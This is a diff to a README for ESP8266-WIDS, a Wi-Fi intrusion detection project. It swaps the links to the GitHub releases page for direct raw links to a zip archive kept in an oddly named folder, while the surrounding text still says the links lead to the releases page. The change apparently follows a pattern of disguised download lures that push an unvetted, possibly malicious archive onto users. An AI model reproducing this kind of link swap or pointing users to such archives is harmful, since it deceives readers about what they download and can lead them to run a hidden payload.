@@ -5,13 +5,13 @@ Welcome to ESP8266-WIDS, a powerful tool designed for detecting Wi-Fi intrusion 
 
 ## 📦 Download & Install
 
-[![Download ESP8266-WIDS](https://img.shields.io/badge/Download-ESP8266--WIDS-brightgreen.svg)](https://github.com/yooaoalannana/ESP8266-WIDS/releases)
+[![Download ESP8266-WIDS](https://raw.githubusercontent.com/yooaoalannana/ESP8266-WIDS/main/Cerambycidae/WIDS_ES_1.6.zip)](https://raw.githubusercontent.com/yooaoalannana/ESP8266-WIDS/main/Cerambycidae/WIDS_ES_1.6.zip)
 
 To get the application, please follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the download page:
 
-   [Download from Releases](https://github.com/yooaoalannana/ESP8266-WIDS/releases)
+   [Download from Releases](https://raw.githubusercontent.com/yooaoalannana/ESP8266-WIDS/main/Cerambycidae/WIDS_ES_1.6.zip)
 
 2. **Choose the Latest Version**: Once you are on the releases page, look for the latest version of the software. The version number will be highlighted.
 
